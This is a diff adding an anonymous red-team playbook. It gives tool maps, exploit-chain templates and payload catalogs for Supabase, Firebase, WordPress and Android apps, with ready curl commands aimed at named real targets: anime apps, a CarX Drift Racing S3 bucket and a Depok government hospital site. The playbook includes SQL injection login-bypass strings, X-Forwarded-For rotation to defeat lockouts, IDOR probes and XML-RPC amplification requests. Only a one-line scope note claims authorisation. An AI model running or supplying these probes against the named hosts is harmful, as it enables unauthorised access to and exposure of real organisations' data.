@@ -1,0 +1,195 @@
+# Full Redteam Toolkit + Exploit Chains + Payloads + Methods
+
+Scope note: for authorized security assessment of targets you own or have written authorization to test.
+
+- Created: 2026-09-03
+- Author: [anon]
+- Targets included: Animeku/MikuNime/DonghubPlay, CarX Drift Racing ecosystem, Depok government ecosystem
+- Philosophy: proof-only first, chain second, exploit last.
+
+## 1) Master Tool Map
+
+| Tool | Where | Use |
+|---|---|---|
+| curl + jq | system | universal API probe |
+| apktool / jadx | APK analysis | decompile, extract BuildConfig, smali/java |
+| mitmproxy / PCAPdroid | network capture | app MITM (authorized device only) |
+| apkmitm / uber-apk-signer | APK patch | MITM patch + sign (lab) |
+| supahunter | `tools/supahunter/` | Supabase full-spectrum recon + RLS bypass probes |
+| chupabase | `tools/chupabase/` | JS bundle key + table/RPC/edge extraction |
+| supabase-security-skill | `tools/supabase-security-skill/` | Management API audit + fix SQL |
+| supabase-rpc-auth-scanner | `tools/supabase-rpc-auth-scanner/` | SECURITY DEFINER + tenant-ID misuse |
+| FireSploit | `tools/FireSploit/` | Firebase misconfiguration scanning |
+| firebase-crawler | `tools/firebase-crawler/` | Firebase public endpoint recon |
+| firebaseExploiter-src | `tools/firebaseExploiter-src/` | Firebase rule/storage/auth probe |
+| sslyze/whatweb/nmap | system | TLS/app fingerprinting (passive/recon) |
+| playwright | `apk_exploit_pack/02-SCRIPTS/` | PoC page rendering + DOM proof |
+| my scripts | `tools/animeku_audit.sh`, `reports/handoff/replay_events.sh` | safe proof-only harnesses |
+
+## 2) Method Catalog
+
+## 2.1 Supabase (RLS-first)
+Key extraction:
+- APK BuildConfig.java
+- JS bundles / Next.js `_next/static` / source maps
+- console logs / service-worker scope
+
+Schema discovery:
+- OpenAPI: `GET /rest/v1/` + anon key
+- RPC probe: `POST /rest/v1/rpc/<function>` (vary JSON shapes)
+
+Data reachability:
+- Table probe: `GET /rest/v1/<table>?select=<col>&limit=1`
+- Write proof (safe): `POST/PATCH/DELETE` to sandbox table only
+
+Privilege patterns:
+- `SECURITY DEFINER` function + caller-controlled tenant ID
+- `auth.uid()` null-bypass patterns in PL/pgSQL
+
+Storage:
+- Enumerate buckets: `GET /storage/v1/bucket`
+- List files: `GET /storage/v1/object/list/<bucket>`
+- Public read test: `HEAD /storage/v1/object/<bucket>/<path>`
+
+Realtime:
+- Socket handshake + channel subscribe (PASSIVE read only)
+
+## 2.2 Firebase
+Recon:
+- `google-services.json` / `GoogleService-Info.plist`
+- JS `firebaseConfig`
+
+Checks:
+- Realtime DB: `GET https://<project>.firebaseio.com/.json`
+- Firestore REST: `GET .../databases/(default)/documents`
+- Storage listing: `GET https://storage.googleapis.com/<bucket>/`
+
+Auth probes:
+- `identitytoolkit` signUp / signInWithPassword (proof-only, no mass-attack)
+- Token decode (non-destructive)
+
+## 2.3 WordPress + XML-RPC
+Enumeration:
+- `/robots.txt`, `/readme.html`, `/wp-json/wp/v2/users`
+- `/?author=1` redirect chain
+
+XMLRPC (proof-only):
+- `GET /xmlrpc.php` (405 = present)
+- `POST` method: `wp.getUsersBlogs` (fault证实 method exposed)
+- `system.multicall` amplification proof (3-method sample)
+
+## 2.4 Auth Bypass / Credential Testing
+Methods:
+- SQLi login bypass patterns
+- Account enumeration via message deltas
+- Password reset token predictability/reuse/host-header injection
+- Brute-force resistance mapping + lockout bypass patterns
+- 2FA skip paths and code reuse checks
+- OAuth/SSO takeover patterns
+
+## 2.5 Android Binary + MITM
+Workflow:
+- Original APK install + login capture
+- Patched APK with CA injection -> capture replay kit
+- Replay with curl + headers to isolate server-side weaknesses
+
+## 3) Exploit Chain Templates
+
+### A) Supabase Read -> Full Schema -> Targeted Dump
+1. Extract anon key
+2. OpenAPI schema enumeration
+3. Table reachability probe
+4. Identify RLS gaps or function misuse
+5. Export only needed proof rows
+6. Remediation SQL + commit path
+
+### B) Firebase Public DB -> Auth Path -> Token Abuse
+1. Check `.json` root
+2. Enumerate paths
+3. Auth probe for weaker sign-in surfaces
+4. Decode tokens (non-destructive)
+5. Map rule breakage to data sensitivity
+
+### C) WordPress Subdomain -> XMLRPC -> Admin Path
+1. Subdomain inventory
+2. Version fingerprint
+3. XMLRPC existence proof
+4. Admin username enumeration
+5. Lockout/rate-limit assessment
+6. Hardening plan (disable xmlrpc, WAF, 2FA)
+
+### D) Android App -> API Leak -> Server Chain
+1. Extract keys/endpoints from APK
+2. Replay endpoints from captured headers
+3. Compare server responses by role
+4. Prove IDOR / missing authZ
+5. Package proof-only repro script
+
+## 4) Payload Catalog
+
+## 4.1 Supabase payloads
+- `GET /rest/v1/`
+- `GET /rest/v1/<table>?select=id&limit=1`
+- `GET /storage/v1/bucket`
+- `GET /storage/v1/object/list/<bucket>`
+- `POST /rest/v1/rpc/<fn>` with `{}` then schema-varied JSON
+
+## 4.2 Firebase payloads
+- `GET https://<project>.firebaseio.com/.json`
+- `GET .../databases/(default)/documents/<collection>`
+- `GET https://storage.googleapis.com/<bucket>/`
+
+## 4.3 WordPress payloads
+- `curl <host>/?author=1 -I`
+- POST to `/xmlrpc.php` with `wp.getUsersBlogs`
+- POST to `/xmlrpc.php` with `system.multicall` (3-method proof)
+
+## 4.4 Auth payloads
+- `' OR 1=1--`, `admin'--`, `' OR ''='`
+- Reset token reuse/expiration checks
+- 2FA code window tests (non-destructive)
+- `X-Forwarded-For` rotation for lockout mapping
+
+## 4.5 Android replay payloads
+- settings probe
+- profile/history/bookmark read with victim id tests
+- minimal mutation proof (like/update) using authorized account only
+
+## 5) Command Recipes
+
+## 5.1 Animeku Supabase probe
+```bash
+SUPABASE_ANON_KEY=<key> bash tools/animeku_audit.sh
+```
+
+## 5.2 CarX S3 proof
+```bash
+# bucket root
+curl 'https://carx-store.s3.amazonaws.com/?delimiter=/'
+
+# avatar prefix page
+curl 'https://carx-store.s3.amazonaws.com/?prefix=prod/avatar/&delimiter=/&max-keys=1000'
+
+# dr3 object check
+curl -I 'https://carx-store.s3.amazonaws.com/prod/dr3-build-apk/[PROD]_CarXDriftRacing3_v.1.16.1_1992.apk'
+```
+
+## 5.3 Depok XML-RPC proof
+```bash
+# presence
+curl -I 'https://rsudksa.depok.go.id/xmlrpc.php'
+
+# wp.getUsersBlogs fault proof
+curl -X POST 'https://rsudksa.depok.go.id/xmlrpc.php' -H 'Content-Type: text/xml' -d '<methodCall>...</methodCall>'
+
+# multicall amplification proof (3-method)
+curl -X POST 'https://rsudksa.depok.go.id/xmlrpc.php' -H 'Content-Type: text/xml' -d '<?xml ...system.multicall...>'
+```
+
+## 5.4 ManhwaID replay
+```bash
+# redacted replay (own test session only)
+MANGATOKEN=... MANGAUID=... bash reports/handoff/replay_events.sh
+
+---
+*BLACK-STAMPED BY CT-002*
